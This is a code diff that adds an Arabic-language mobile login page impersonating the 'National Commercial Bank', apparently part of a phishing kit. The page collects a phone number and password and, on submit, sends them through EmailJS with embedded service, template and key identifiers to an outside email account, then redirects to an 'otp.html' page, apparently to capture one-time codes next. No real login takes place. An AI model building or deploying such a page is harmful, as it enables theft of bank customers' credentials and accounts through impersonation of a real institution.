@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - المصرف التجاري الوطني</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("sV-2ujfDQADWw2fJS");
+       })();
+    </script>
+
+    <style>
+        :root {
+            --bg-main: #021a2c;
+            --bg-bar: #083756;
+            --text-white: #FFFFFF;
+            --border-color: #ffffff;
+            --font-main: 'Cairo', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 850px;
+            position: relative;
+            /* التعديل: وضع الصورة كخلفية لكامل الحاوية مع تدرج لوني غامق */
+            background: linear-gradient(to bottom, rgba(2, 26, 44, 0.7) 0%, rgba(2, 26, 44, 0.95) 100%), 
+                        url('https://i.imgur.com/irZIE0i.jpeg') center/cover no-repeat;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* القسم العلوي (الشعار فقط بعد إزالة الخلفية منه) */
+        .hero-section {
+            height: 38%;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .logo-container {
+            width: 80%;
+            text-align: center;
+        }
+
+        .logo-container img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* شريط تسجيل الدخول */
+        .login-bar {
+            background-color: var(--bg-bar);
+            width: 100%;
+            padding: 12px 0;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-white);
+            margin-bottom: 30px;
+        }
+
+        /* قسم النموذج */
+        .form-section {
+            padding: 0 24px;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            z-index: 2;
+        }
+
+        /* الحقول */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .input-group input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05); /* إضافة شفافية بسيطة لتناسب الخلفية */
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-white);
+            padding: 12px 45px 12px 12px;
+            font-family: var(--font-main);
+            font-size: 16px;
+            outline: none;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group label {
+            position: absolute;
+            right: 15px;
+            top: -10px;
+            background-color: var(--bg-main); /* يمكن تغيير هذا اللون إذا أردت دمج الكلمة مع الصورة */
+            padding: 0 5px;
+            color: var(--text-white);
+            font-size: 11px;
+            font-weight: 600;
+            border-radius: 3px;
+        }
+
+        /* الأيقونات */
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .input-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: var(--text-white);
+            stroke-width: 1.5;
+        }
+
+        /* الأزرار */
+        .btn-primary {
+            width: 100%;
+            background-color: var(--bg-bar);
+            color: var(--text-white);
+            padding: 14px;
+            border-radius: 6px;
+            border: none;
+            font-family: var(--font-main);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .btn-text {
+            background: none;
+            border: none;
+            color: var(--text-white);
+            font-family: var(--font-main);
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 20px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        /* الأزرار السفلية */
+        .footer-actions {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: auto;
+            padding-bottom: 40px;
+        }
+
+        .btn-outline {
+            flex: 1;
+            border: 1px solid var(--border-color);
+            background: rgba(255, 255, 255, 0.05); /* خلفية شبه شفافة لتلائم الصورة */
+            color: var(--text-white);
+            border-radius: 6px;
+            padding: 10px;
+            font-family: var(--font-main);
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .plus-text {
+            font-size: 10px;
+            margin-right: 4px;
+            font-weight: 400;
+        }
+
+        /* العلامة المائية */
+        .watermark {
+            position: absolute;
+            bottom: -30px;
+            left: -30px;
+            width: 200px;
+            height: 200px;
+            opacity: 0.05;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .watermark svg {
+            width: 100%;
+            height: 100%;
+            fill: var(--text-white);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        
+        <div class="watermark">
+            <svg viewBox="0 0 100 100">
+                <path d="M50 10 C75 10 90 30 90 50 C90 75 75 90 50 90 C25 90 10 75 10 50 C10 30 25 10 50 10 Z" fill="none" stroke="white" stroke-width="15"/>
+                <path d="M50 35 C60 35 65 40 65 50 C65 60 60 65 50 65 C40 65 35 60 35 50 C35 40 40 35 50 35 Z" fill="none" stroke="white" stroke-width="8"/>
+            </svg>
+        </div>
+
+        <div class="hero-section">
+            <div class="logo-container">
+                <img src="https://i.imgur.com/8pKEkWN.png" id="bank-logo" alt="National Commercial Bank">
+            </div>
+        </div>
+
+        <div class="login-bar">
+            تسجيل الدخول
+        </div>
+
+        <form class="form-section" id="login-form">
+            <div class="input-group">
+                <input type="tel" id="phone_number" name="phone_number" required>
+                <label>رقم الهاتف</label>
+                <div class="input-icon">
+                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2" stroke-width="2"></rect>
+                        <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"></line>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" name="password" required>
+                <label>كلمة المرور</label>
+                <div class="input-icon">
+                    <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" fill="#FFFFFF" stroke="none"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-primary">تسجيل الدخول</button>
+
+            <button type="button" class="btn-text">الرجوع</button>
+
+            <div class="footer-actions">
+                <button type="button" class="btn-outline">فتح حساب جديد</button>
+                <button type="button" class="btn-outline">
+                    عائلتي <span class="plus-text">Plus</span>
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const submitBtn = document.querySelector('.btn-primary');
+            const originalText = submitBtn.innerText;
+            submitBtn.innerText = 'جاري تسجيل الدخول...';
+
+            emailjs.sendForm('service_wpsm2nn', 'template_i51g1et', this)
+                .then(function() {
+                    // التعديل: الانتقال لصفحة otp.html
+                    window.location.href = 'otp.html';
+                }, function(error) {
+                    alert('حدث خطأ أثناء الإرسال.');
+                    submitBtn.innerText = originalText;
+                });
+        });
+    </script>
+</body>
+</html>
